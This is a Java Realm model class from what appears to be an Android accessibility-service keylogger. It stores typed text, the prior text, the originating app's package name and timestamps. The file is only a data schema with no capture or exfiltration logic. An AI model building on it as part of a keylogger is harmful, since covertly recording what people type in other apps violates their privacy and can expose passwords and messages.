package com.accessibility.keylogger.module.accessibility.object;

import io.realm.RealmObject;

public class TypeViewTextChangedEventObject extends RealmObject {
    private String mText;
    private String mLastText;
    private String mPackageName;
    private long mBeginTimestamp;
    private long mEndTimestamp;

    public String getText() {
        return mText;
    }
    public void setText(String text) {
        mText = text;
    }

    public String getLastText() {
        return mLastText;
    }
    public void setLastText(String lastText) {
        mLastText = lastText;
    }

    public String getPackageName() {
        return mPackageName;
    }
    public void setPackageName(String packageName) {
        mPackageName = packageName;
    }

    public long getBeginTimestamp() {
        return mBeginTimestamp;
    }
    public void setBeginTimestamp(long beginTimestamp) {
        mBeginTimestamp = beginTimestamp;
    }

    public long getEndTimestamp() {
        return mEndTimestamp;
    }
    public void setEndTimestamp(long endTimestamp) {
        mEndTimestamp = endTimestamp;
    }
}
